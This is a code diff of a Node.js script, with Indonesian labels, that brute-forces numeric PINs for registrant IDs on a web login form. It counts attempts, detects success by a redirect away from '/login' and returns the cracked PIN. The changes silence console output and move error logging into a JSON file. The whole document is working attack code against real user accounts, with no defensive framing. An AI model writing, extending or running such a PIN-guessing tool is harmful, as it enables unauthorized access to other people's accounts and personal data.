@@ -118,19 +118,8 @@ async function login(idpendaftar, nama, startss, endss, nomor) {
         waktuPrev: `Waktu: ${fmt(job.timePrev)} | Prev: ${job.prev}`,
         waktuNext: `Waktu: ${fmt(Date.now() - job.start)} | Next ID: ${job.next}`,
         running: fmt(Date.now() - job.starts),
+        status: 0
       };
-      /*console.clear();
-      console.log("---------------");
-      console.log(`Nama: ${nama} / NO ${no}`);
-      console.log(`Sekarang: ${count}/${total} | Sisa: ${sisa}`);
-      console.log(`Kesalahan: ${countError}`);
-      console.log(`Percobaan Ke: ${coba}/1096`);
-      console.log(`Waktu: ${fmt(timePrev)} | Prev: ${prev}`);
-      console.log(`Waktu: ${fmt(Date.now() - start)} | Next ID: ${next}`);
-      console.log("---------------");
-      console.log(`Waktu Jalan: ${fmt(Date.now() - starts)}`)
-      console.log(`ID: ${idpendaftar}`);
-      console.log("Mencoba PIN: " + pin);*/
       const body = new URLSearchParams({
         idpendaftar,
         pin,
@@ -146,13 +135,11 @@ async function login(idpendaftar, nama, startss, endss, nomor) {
         }
       });
       job.statusData.status = res.status;
-      job.statusData.html = res.data;
       
       const finalUrl = res.request?.res?.responseUrl ?? res.config.url;
       if (!finalUrl.includes('/login')) {
         job.coba = 0;
         job.timePrev = Date.now() - job.start;
-        console.log('Login berhasil! PIN: ' + pin);
         g.reset();
         jar.removeAllCookiesSync();
         return pin;
@@ -235,26 +222,29 @@ function fmt(ms) {
 
 function saveError(err) {
   countError++;
-  const dir = "logs";
-  fs.mkdirSync(dir, { recursive: true });
+  const filePath = path.join(__dirname, "../lib", "axios-errors.json");
   
-  const date = new Date().toISOString().slice(0, 10);
-  const file = path.join(dir, `${date}.log`);
+  let logs = [];
   
-  fs.appendFileSync(
-    file,
-    `\n=== ${new Date().toISOString()} ===\n${err.stack || err}\n`
-  );
+  if (fs.existsSync(filePath)) {
+    logs = JSON.parse(fs.readFileSync(filePath, "utf8"));
+  }
+  
+  logs.push({
+    waktu: new Date().toISOString(),
+    ...err.toJSON(),
+  });
+  
+  fs.mkdirSync(path.dirname(filePath), { recursive: true });
+  fs.writeFileSync(filePath, JSON.stringify(logs, null, 2), "utf8");
 }
 
 process.on("uncaughtException", err => {
-  console.error(err);
   saveError(err);
   // Tidak process.exit()
 });
 
 process.on("unhandledRejection", err => {
-  console.error(err);
   saveError(err);
   // Tidak process.exit()
 });
